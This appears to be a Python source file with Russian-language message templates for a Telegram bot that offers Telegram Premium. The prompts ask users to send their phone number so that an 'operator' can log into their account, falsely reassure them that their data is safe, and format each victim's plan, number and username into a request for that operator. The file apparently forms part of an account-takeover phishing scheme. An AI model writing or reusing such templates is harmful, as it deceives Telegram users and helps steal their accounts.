class TgForms:
    NUMBER_PROMPT = (
    "Пожалуйста, отправьте ваш номер телефона 📱, чтобы оператор мог войти в ваш аккаунт 🔐 "
    "и оформить подписку Telegram Premium ⭐ специально для вас.\n"
    "Ваши данные будут в безопасности 🔒 и будут использоваться только для оформления подписки."
    )

    CONFIRMATION_TEXT = (
    "Спасибо! 🙏\n"
    "Ваши данные успешно получены 📱.\n"
    "Пожалуйста, оставайтесь на связи 📞 — оператор свяжется с вами в течение 10–15 минут ⏰.\n\n"
    "Наш сервис надёжен 🔐 — ваши данные используются только для оформления подписки и не передаются третьим лицам 🔒."
    )

    USE_REPLY_BUTTON = (
    "Пожалуйста, используйте кнопку ниже 🔽 для отправки номера телефона 📱.\n"
    "Ввод номера вручную не поддерживается ⚠️.\n"
    "Если вы хотите отменить заявку — отправьте команду /stop 🚫."
    )

    @staticmethod
    def get_request_text(data: dict, phone_number: str, username: str | None = None) -> str:
        return (
    "┏━━━━━━━━━━━━━━━━━━━┓\n"
    f"<b>🔹 Тариф:</b>   <code>{data.get('plan').capitalize()}</code>\n"
    f"<b>🔹 Номер:</b>   <code>{phone_number}</code>\n"
    f"<b>🔹 Username:</b>   @{username if username else 'Username отсутствует'}\n"
    "┗━━━━━━━━━━━━━━━━━━━┛\n\n"
    )